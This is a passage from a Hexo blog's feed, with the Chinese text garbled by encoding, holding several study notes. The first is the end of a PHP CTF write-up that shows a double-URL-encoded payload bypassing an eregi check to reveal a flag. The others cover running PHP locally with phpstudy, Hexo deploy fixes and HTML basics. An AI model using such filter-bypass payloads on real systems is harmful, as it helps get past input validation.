class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#é¢˜ç›®æºä»£ç </span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p>éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<code>eregi(&quot;hackerDJ&quot;,$_GET[&#39;id&#39;])</code>ä¸ºfalseï¼›ç»è¿‡urldecodeç¼–ç åæ»¡è¶³<code>$_GET[&#39;id&#39;] == &quot;hackerDJ&quot;</code></p><p>ä¹Ÿå°±æ˜¯è¯´ä¼ å…¥å€¼ä¸èƒ½æ˜¯hackerDJï¼Œä½†æ˜¯ä¼ å…¥å€¼<strong>ç»è¿‡urldecodeè§£ç å</strong>è¦å’ŒhackerDJç›¸ç­‰ã€‚</p><p>æ‰€ä»¥ä¼ å…¥æ—¶è¦å°†hackerDJçš„urlç¼–ç å†ç¼–ç ä¸€æ¬¡ã€‚</p><p><strong>æœ€ç»ˆplayload</strong>ï¼š<code>?id=%2568%2561%2563%256b%2544%254a</code></p><hr><p>æ€»è§‰å¾—å°‘äº†ç‚¹ä»€ä¹ˆåŸæ¥æ˜¯æŠŠè¿™ä¸ªç¬”è®°å¿˜è®°å–½</p><p>å‘ä¸Šæ¥é˜²æ­¢è‡ªå·±æ‰‹è´±åˆ æ‰ğŸ¦­</p><p>æŠŠä¸‡å¸ˆå‚…çš„åŸåšæ”¾è¿™é‡Œ</p><p><a href="https://drun1baby.github.io/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">PHP å…¥é—¨åŸºç¡€æ¼æ´ | èŠœé£ (drun1baby.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨æµè§ˆå™¨æ‰“å¼€æœ¬åœ°PHPæ–‡ä»¶</title>
    <link href="/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>éšæœºæ‰è½åºŸç‰©Modç ”ç©¶phpçš„ç¬”è®°ğŸ˜®</p><span id="more"></span><h2 id="01-é…ç½®PHPè¿è¡Œç¯å¢ƒ"><a href="#01-é…ç½®PHPè¿è¡Œç¯å¢ƒ" class="headerlink" title="01 é…ç½®PHPè¿è¡Œç¯å¢ƒ"></a>01 é…ç½®PHPè¿è¡Œç¯å¢ƒ</h2><p>ä¸‡èƒ½çš„äº’è”ç½‘æ•™æˆ‘ä¸‹è½½Apacheï¼ŒPHPå’ŒMySQLã€‚å¥½å¤šå¥½éº»çƒ¦ã€‚æˆ‘é€‰æ‹©ç›´æ¥ç”¨é›†æˆç¯å¢ƒã€‚</p><p><a href="https://www.xp.cn/">phpstudyå®˜ç½‘</a></p><p>ç›´æ¥å»å®˜ç½‘ä¸‹è½½ï¼Œä¼šæœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹ä»¥åæ‰“å¼€ç¬¬ä¸€ä¸ªexeæ–‡ä»¶å®‰è£…å°±å¥½ã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-04-46.png"></p><p>æ³¨æ„ï¼šå‹ç¼©åŒ…ä¿å­˜çš„è·¯å¾„ä¸èƒ½æœ‰ä¸­æ–‡å’Œç©ºæ ¼</p><p>åœ¨å®‰è£…æ—¶çš„è‡ªå®šä¹‰é€‰é¡¹ä¸­å¯ä»¥ä¿®æ”¹å®‰è£…åŒ…çš„ä½ç½®ï¼Œæˆ‘çš„æ˜¯é»˜è®¤åœ¨Dç›˜æ ¹ç›®å½•ï¼ŒæŠŠå®ƒæ”¹åˆ°æ”¾å‹ç¼©åŒ…çš„æ–‡ä»¶å¤¹é‡Œäº†ã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-06-25.png"></p><p>æ ¹æ®æœ¬äººå°è¯•ï¼Œåœ¨æµè§ˆå™¨çœ‹PHPæ–‡ä»¶åªéœ€è¦æŠŠApacheæ‰“å¼€å°±è¡Œã€‚</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-32-00.png"></p><h2 id="02-æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•"><a href="#02-æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•" class="headerlink" title="02 æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•"></a>02 æŠŠæ–‡ä»¶ä¸¢è¿›ç½‘ç«™æ ¹ç›®å½•</h2><p>åœ¨ä¸Šè¿°å®‰è£…æ­¥éª¤æ­¥éª¤ä¸­ï¼Œä¼šç”Ÿæˆ<strong>phpstudy_pro</strong>æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸­åˆæœ‰<strong>WWW</strong>æ–‡ä»¶å¤¹ã€‚</p><p>ç½‘ç«™æ ¹ç›®å½•å°±æ˜¯wwwæ–‡ä»¶ä¸‹ï¼Œå¿…é¡»å°†æ–‡ä»¶æ”¾ç½®æ­¤ä½ç½®æ‰ç®—æœ‰æ•ˆï¼Œå¦åˆ™æ— æ³•è¿è¡Œphpæ–‡ä»¶ã€‚</p><h2 id="03-è¿è¡ŒPHPæ–‡ä»¶"><a href="#03-è¿è¡ŒPHPæ–‡ä»¶" class="headerlink" title="03 è¿è¡ŒPHPæ–‡ä»¶"></a>03 è¿è¡ŒPHPæ–‡ä»¶</h2><p>æ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨å¯¼èˆªæ è¾“å…¥<code>localhost/[æ–‡ä»¶å]</code>å°±å¯ä»¥å•¦</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-42-05.png"></p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-41-36.png"></p><h2 id="04-åœŸç‹—å‘è¨€"><a href="#04-åœŸç‹—å‘è¨€" class="headerlink" title="04 åœŸç‹—å‘è¨€"></a>04 åœŸç‹—å‘è¨€</h2><p>å› ä¸ºæœ‰ä¸€ä¸ªæ–‡ä»¶å†™é”™äº†ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€çš„æ—¶å€™æŠ¥é”™äº†ã€‚</p><p>å®ƒå±…ç„¶è¿˜å¯ä»¥æŠ¥é”™ï¼</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_21-09-18.png"></p><p>å¤ªé«˜çº§äº†</p><hr><p>é›†æˆç¯å¢ƒyydsğŸ¥³</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>phpstudy</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexoä½¿ç”¨è®°å½•</title>
    <link href="/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>é‡åˆ°çš„ä¸€äº›å¥‡æ€ªé—®é¢˜å’Œä¿®æ”¹ä¸»é¢˜é¡µé¢çš„ç»éªŒâœ‚ï¸</p><span id="more"></span><h2 id="å¥‡æ€ªé—®é¢˜"><a href="#å¥‡æ€ªé—®é¢˜" class="headerlink" title="å¥‡æ€ªé—®é¢˜"></a>å¥‡æ€ªé—®é¢˜</h2><h4 id="æ’å…¥å›¾ç‰‡å‘"><a href="#æ’å…¥å›¾ç‰‡å‘" class="headerlink" title="æ’å…¥å›¾ç‰‡å‘"></a>æ’å…¥å›¾ç‰‡å‘</h4><p>åœ¨æœ€å¼€å§‹å†™åšå®¢çš„æ—¶å€™ï¼ŒåƒæŒ‘ä¸‡é€‰æ‰¾äº†å¼ ç¾å›¾å‡†å¤‡å½“å°é¢ï¼Œå¤åˆ¶æ–‡ä»¶åœ°å€æ’å…¥ã€‚<code>hexo g</code> <code>hexo s</code>æœ¬åœ°é¢„è§ˆä¸€åˆ‡æ­£å¸¸ï¼Œ<code>hexo d</code>ä¸€æ¡é¾™æ¨ä¸Šå»å‘ç°å›¾ç‰‡è¢«å’Œè°æ‰äº†ï¼ˆ<del>ä¸æ˜¯</del>ï¼‰</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-13-07.png"></p><p>å‰å»ä¸‡èƒ½çš„äº’è”ç½‘å¯»æ‰¾äº†ä¸€ä¸‹ç­”æ¡ˆï¼Œæœ‰çš„è¯´å†™æ–‡ç« çš„æ—¶å€™è¦å»ºä¸€ä¸ªåŒåæ–‡ä»¶å¤¹æ”¾å›¾ç‰‡ï¼Œæœ‰çš„è¯´è¦å®‰è£…æ’ä»¶ã€‚</p><p>æˆ‘å½“ç„¶æ˜¯é€‰æ‹©å»ºæ–‡ä»¶å¤¹è¿™ä¸ªæ›´ç®€å•çš„æ“ä½œã€‚</p><p>åœ¨é…ç½®æ–‡ä»¶_config.ymlé‡Œæ‰¾åˆ°<strong>post_asset_folder</strong>ï¼ŒæŠŠfalseæ”¹ä¸ºtrueï¼Œå†æ¬¡<code>hexo new</code>å°±å»ºå¥½.mdæ–‡ä»¶å’Œæ–‡ä»¶å¤¹äº†ã€‚ç»è¿‡æœ¬äººä¸€é¡¿Ctrl+Cå’ŒCtrl+Vçš„æ“ä½œæŠŠåŸæ–‡ä»¶å’Œå›¾ç‰‡ç§»åˆ°æ–°çš„æ–‡ä»¶ï¼Œå……æ»¡ä¿¡å¿ƒåœ°å†æ¬¡<code>hexo g</code> <code>hexo d</code></p><p>è¿˜æ˜¯ä¸æ˜¾ç¤ºå›¾ç‰‡</p><p>å¥½çš„ğŸ˜¢<del>ä¸€å®šæ˜¯å›¾ç‰‡å®ƒçœŸçš„è¿ç¦äº†</del></p><p>å½“æˆ‘å†æ¬¡åœ¨äº’è”ç½‘æœç´¢æ—¶ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªåç‚¹</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-22-06.png"></p><p>è¿™ä¸ªmarkdownè¯­æ³•é‡Œçš„å›¾ç‰‡æ’å…¥æ˜¯<code>/</code>ï¼Œä½†æ˜¯æˆ‘å¤åˆ¶çš„å›¾ç‰‡è·¯å¾„ç”¨çš„æ˜¯<code>\</code>ï¼</p><p>æˆ‘å°è¯•ç€ä¿®æ”¹ä¹‹åå†æ¬¡<code>hexo d</code></p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-30-47.png"></p><p>å°±è¿™ä¹ˆæˆåŠŸäº†ğŸ¤¨</p><h4 id="Spawn-failedå‘"><a href="#Spawn-failedå‘" class="headerlink" title="Spawn failedå‘"></a>Spawn failedå‘</h4><p>ç¾æ»‹æ»‹å‘äº†ä¸€ç¯‡ç¬”è®°ä¸Šæ¥ï¼Œå‘ç°æ ¼å¼æœ‰bugï¼ŒæŠ“ç´§æ—¶é—´ä¿®æ”¹ã€‚ä¿®æ”¹ä¹‹åå†æ¬¡ä¸æ»‘ä¸€æ¡é¾™ä¸Šä¼ Â·Â·Â·Â·Â·Â·</p><p>æ²¡ä¸æ»‘æˆåŠŸ</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-07-25.png"></p><p>æŠ¥é”™å–½ğŸ¥³<del>æˆ‘é¢å®¹å¹³å’Œæ ¹æœ¬å°±æ²¡æœ‰åœ¨ç”Ÿæ°”</del></p><p>ç¿»è¯‘äº†ä¸€ä¸‹æ˜¯â€œè¯·ç¡®ä¿æ‚¨æœ‰æ­£ç¡®çš„è®¿é—®æƒé™â€ï¼Œä¸ä¼šæã€‚æŠŠç›®å…‰æŠ•å‘ä¸‡èƒ½çš„äº’è”ç½‘ï¼Œç½‘ä¸Šè¯´æ˜¯è¿æ¥çš„é—®é¢˜ã€‚</p><p>çœ‹åˆ°ä¸€æ¡è¯´å› ä¸ºgit è¿›è¡Œ<code>push</code>æˆ–è€…<code>hexo d</code>çš„æ—¶å€™æ”¹å˜äº†ä¸€äº›.deploy_gitæ–‡ä»¶ä¸‹çš„å†…å®¹ï¼Œåªéœ€è¦é‡æ–°downä¸€ä¸‹å°±è¡Œã€‚</p><p>äºæ˜¯åˆ é™¤.deploy_gitæ–‡ä»¶å¤¹ï¼Œå†æ¬¡<code>hexo c</code> <code>hexo g</code> <code>hexo d</code>ã€‚å‡ºç°äº†ä¸€ä¸ªæ–°çš„.deploy_gitæ–‡ä»¶ï¼</p><p>ä¾æ—§æŠ¥é”™ğŸ¥€</p><p>åˆç»§ç»­å†²æµªæ‰¾è§£å†³æ–¹æ¡ˆï¼Œåˆçœ‹åˆ°ä¸€æ¡è¯´è¦åœ¨_config.ymlæ–‡ä»¶é‡ŒæŠŠ<strong>repo</strong>åœ°å€æ”¹æˆgitåœ°å€ã€‚æˆ‘æ—©å°±æ”¹è¿‡äº†ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªäººçš„<strong>deploy</strong>æ¡ç›®æ¯”æˆ‘å¤šä¸€ä¸ª<strong>branch</strong>ã€‚</p><p>ç§‰æ‰¿ç€ä¸é”™è¿‡ä»»ä½•ä¸€ä¸ªç»†èŠ‚çš„æ€åº¦æˆ‘åœ¨è‡ªå·±çš„æ–‡ä»¶é‡Œä¹ŸåŠ ä¸Šäº†è¿™æ¡å¹¶è®¤çœŸå¡«å…¥masterã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-11-55.png"></p><p>ä¿å­˜ï¼Œ<code>hexo d</code>ï¼ŒåŠ è½½æˆåŠŸï¼Ÿï¼Ÿï¼Ÿ</p><p>äº‹æƒ…æ€ä¼šå¦‚æ­¤ç®€å•ï¼Œæˆ‘è§£å†³å®Œé—®é¢˜æ‰æƒ³èµ·è¦è®°å½•ä¸€ä¸‹è¸©å‘æ–°é²œäº‹ï¼Œäºæ˜¯ä¹å†æ¬¡<code>hexo d</code>æƒ³çœ‹çœ‹æ•ˆæœã€‚</p><p>åˆæŠ¥é”™äº†ğŸ˜®æˆ‘æ‰åå…«çœ¼ç¥è¿˜æŒºå¥½ä½¿çš„éš¾é“åˆšæ‰æ˜¯çœ¼èŠ±äº†å—ï¼Ÿ</p><p>æ¢äº†ä¸ªæœç´¢å¼•æ“ç»§ç»­æœï¼Œçœ‹åˆ°ä¸€ä¸ªcsdnä¸Šçš„è®¨è®ºï¼Œéƒ½è®©ä¿®æ”¹repoåœ°å€ã€‚æˆ‘ä¸ä¿¡é‚ªç»§ç»­å¾€ä¸‹æ‹‰ï¼Œçœ‹åˆ°ä¸€æ¡æ ‡ç­¾</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-17-43.png"></p><p>æˆ‘è„‘æµ·ä¸­çš„å°ç¯æ³¡çªç„¶å°±äº®äº†ï¼Œæˆ‘å›åˆ°æµè§ˆå™¨çœ‹è‡ªå·±çš„åšå®¢ï¼Œæ ¼å¼å·²ç»ä¿®æ”¹è¿‡æ¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´é‚£æ¬¡çœ¼èŠ±æ˜¯çœŸçš„æ¨ä¸Šå»äº†ã€‚</p><p>Githubä½ ä¸è¦å¤ªè’è°¬ğŸ˜…</p><h2 id="ä¿®æ”¹ä¸»é¢˜é…ç½®"><a href="#ä¿®æ”¹ä¸»é¢˜é…ç½®" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜é…ç½®"></a>ä¿®æ”¹ä¸»é¢˜é…ç½®</h2><h4 id="é¡µè„šç‰ˆæƒå£°æ˜"><a href="#é¡µè„šç‰ˆæƒå£°æ˜" class="headerlink" title="é¡µè„šç‰ˆæƒå£°æ˜"></a>é¡µè„šç‰ˆæƒå£°æ˜</h4><p>åŸæœ¬çš„ä¸»é¢˜é¡µè„šï¼Œå§ä¸å–œæ¬¢ï¼Œè¿™ä¸ªçˆ±å¿ƒå¤ªä¸ç¬¦åˆå§Bkingçš„äººè®¾äº†ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-35-37.png"></p><p>æˆ‘æƒ³è¦æœ‰ä¸ªäººç‰ˆæƒå£°æ˜çš„é¡µè„šï¼Œç»è¿‡å­¦ä¹ æŒæ¡ç‰ˆæƒå£°æ˜æ ¼å¼åæˆ‘å¼€å§‹å‡†å¤‡å¤§æ”¹ç‰¹æ”¹ã€‚</p><p>å‡­å€Ÿæˆ‘åªæœ‰ä¸€ç‚¹çŸ¥è¯†çš„è„‘å£³å‘Šè¯‰æˆ‘è¿™ç§é¡µé¢è¦ç”¨HTMLæ¥å†™ã€‚å¥ˆä½•è‚šå­é‡Œå¢¨æ°´å¤ªå°‘ï¼Œåªæœ‰å›¾çº¸æ²¡æœ‰å·¥å…·æ²¡æ³•ç›–æˆ¿å­<del>ï¼ˆå°±æ˜¯ä¸ä¼šå†™ä»£ç ï¼‰</del></p><p>ç®—äº†ï¼Œè¿˜æ˜¯æ±‚åŠ©ä¸€ä¸‹ä¸‡èƒ½äº’è”ç½‘å§</p><p>æœåˆ°çš„å…¨æ˜¯æ€ä¹ˆç»™é¡µè„šæ·»åŠ è¿è¡Œæ—¶é—´ğŸ¥²å°±æ˜¯æ²¡äººæ•™ä½ æ€ä¹ˆå†™ç‰ˆæƒå£°æ˜ã€‚æ¢ä¸ªæ€è·¯ï¼Œæˆ‘å»æŠ“äº†ä¸€ä¸ªåˆ«äººç½‘é¡µçš„åŒ…ç›´æ¥å·ç°æˆçš„ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-52-54.png"></p><p>ä»£ç getï¼</p><p>ç»è¿‡æˆ‘ä¸€ç•ªåŠªåŠ›ï¼Œåœ¨ä¸»é¢˜çš„.ymlæ–‡ä»¶é‡Œæ‰¾åˆ°äº†<strong>footer</strong>éƒ¨åˆ†ï¼Œéå¸¸æ„Ÿè°¢ä¸»é¢˜ä½œè€…çš„æ³¨é‡Šå†™å¾—é‚£ä¹ˆè¯¦ç»†ï¼Œå¾ˆè½»æ¾å°±æ‰¾åˆ°äº†HTMLä»£ç åŒºã€‚æŠŠåŸæ¥çš„æ³¨é‡Šæ‰ï¼Œå†åŠ ä¸Šè‡ªå·±copyæ¥çš„ä»£ç ã€‚</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-59-56.png"></p><p>ä¸€æ¡é¾™ä»¥åç¾ç¾å¾—åˆ°è‡ªå·±å–œæ¬¢çš„é¡µè„šğŸ¤ª</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-58-07.png"></p>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>æ— ç”¨ä½†ç¾ä¸½çš„æŠ€å·§</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTMLè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€</title>
    <link href="/2023/01/15/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    <url>/2023/01/15/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p>å·å·å·ğŸ§</p><span id="more"></span><h1 id="HTMLç®€ä»‹"><a href="#HTMLç®€ä»‹" class="headerlink" title="HTMLç®€ä»‹"></a>HTMLç®€ä»‹</h1><p>HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ï¼ŒæŒ‡çš„æ˜¯è¶…æ–‡æœ¬<strong>æ ‡è®°è¯­è¨€</strong> (<strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage)</p><h3 id="HTMLæ ‡ç­¾"><a href="#HTMLæ ‡ç­¾" class="headerlink" title="HTMLæ ‡ç­¾"></a>HTMLæ ‡ç­¾</h3><p>HTML æ ‡ç­¾æ˜¯ç”±<strong>å°–æ‹¬å·</strong>åŒ…å›´çš„å…³é”®è¯ï¼Œæ¯”å¦‚ &lt;html&gt;ã€‚</p><p>HTML æ ‡ç­¾å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œå¤§å†™æ ‡ç­¾å’Œå°å†™æ ‡ç­¾ç­‰æ•ˆï¼Œä½†æ¨èä½¿ç”¨å°å†™ã€‚</p><p>ä¸”HTMLæ ‡ç­¾é€šå¸¸æˆå¯¹å­˜åœ¨ï¼Œå‡ºç°çš„ç¬¬ä¸€ä¸ªæ ‡ç­¾æ˜¯å¼€å§‹æ ‡ç­¾ï¼Œç¬¬äºŒä¸ªæ ‡ç­¾æ˜¯ç»“æŸæ ‡ç­¾ï¼Œç»“æŸæ ‡ç­¾å†…æœ‰â€™&#x2F;â€˜ï¼Œæ¯”å¦‚&lt;b&gt; å’Œ &lt;&#x2F;b&gt;</p><h3 id="HTMLæ–‡æ¡£-x3D-ç½‘é¡µ"><a href="#HTMLæ–‡æ¡£-x3D-ç½‘é¡µ" class="headerlink" title="HTMLæ–‡æ¡£ &#x3D; ç½‘é¡µ"></a>HTMLæ–‡æ¡£ &#x3D; ç½‘é¡µ</h3><p>HTMLæ–‡æ¡£ä¹Ÿè¢«ç§°ä½œç½‘é¡µï¼ŒåŒ…å«HTMLæ ‡ç­¾å’Œçº¯æ–‡æœ¬ã€‚</p><p>Web æµè§ˆå™¨çš„ä½œç”¨æ˜¯è¯»å– HTML æ–‡æ¡£ï¼Œå¹¶ä»¥ç½‘é¡µçš„å½¢å¼æ˜¾ç¤ºå‡ºå®ƒä»¬ã€‚æµè§ˆå™¨ä¸ä¼šæ˜¾ç¤º HTML æ ‡ç­¾ï¼Œè€Œæ˜¯ä½¿ç”¨æ ‡ç­¾æ¥è§£é‡Šé¡µé¢çš„å†…å®¹ã€‚</p><h1 id="HTMLåŸºç¡€æ ‡ç­¾"><a href="#HTMLåŸºç¡€æ ‡ç­¾" class="headerlink" title="HTMLåŸºç¡€æ ‡ç­¾"></a>HTMLåŸºç¡€æ ‡ç­¾</h1><h3 id="ç½‘é¡µæ ‡é¢˜"><a href="#ç½‘é¡µæ ‡é¢˜" class="headerlink" title="ç½‘é¡µæ ‡é¢˜"></a>ç½‘é¡µæ ‡é¢˜</h3><p>é€šè¿‡&lt;title&gt;æ ‡ç­¾å®šä¹‰ï¼Œå°†ä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨å¯¼èˆªæ å¤„</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>è¿™æ˜¯å¯¼èˆªæ æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>æµè§ˆå™¨ä¼šå¿½ç•¥æ³¨é‡Šï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå®ƒä»¬ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- è¿™æ˜¯ä¸ªæ³¨é‡Š --&gt;</span><br></code></pre></td></tr></table></figure><h3 id="æ ‡é¢˜"><a href="#æ ‡é¢˜" class="headerlink" title="æ ‡é¢˜"></a>æ ‡é¢˜</h3><p>é€šè¿‡&lt;h1&gt; - &lt;h6&gt; ç­‰æ ‡ç­¾è¿›è¡Œå®šä¹‰ï¼Œå…­ä¸ªæ•°å­—1-6å¯¹åº”ä»å¤§åˆ°å°çš„å…­ç§æ ‡é¢˜å¤§å°ã€‚</p><p>å®ä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>ä¸€çº§æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>äºŒçº§æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ä¸‰çº§æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="åˆ†å‰²çº¿"><a href="#åˆ†å‰²çº¿" class="headerlink" title="åˆ†å‰²çº¿"></a>åˆ†å‰²çº¿</h3><p>é€šè¿‡&lt;hr &#x2F;&gt; æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„ã€‚</p><h3 id="æ®µè½"><a href="#æ®µè½" class="headerlink" title="æ®µè½"></a>æ®µè½</h3><p>æ®µè½é€šè¿‡ &lt;p&gt; æ ‡ç­¾è¿›è¡Œå®šä¹‰ï¼Œ&lt;br&gt;æ ‡ç­¾å®šä¹‰æ¢è¡Œã€‚</p><p>æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ®µè½çš„å‰åæ·»åŠ ç©ºè¡Œã€‚ä½†å¯¹äºåœ¨ä¸€å¯¹æ ‡ç­¾å†…çš„æ–‡å­—ï¼Œæ— è®ºç¼–å†™æ—¶æœ‰æ— æ¢è¡Œï¼Œåªè¦ä¸æ·»åŠ &lt;br&gt;æ ‡ç­¾ï¼Œæœ€ç»ˆæ•ˆæœéƒ½åœ¨åŒä¸€è¡Œã€‚</p><p>å®ä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This is a paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This is a paragraph.<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>This is another paragraph.<span 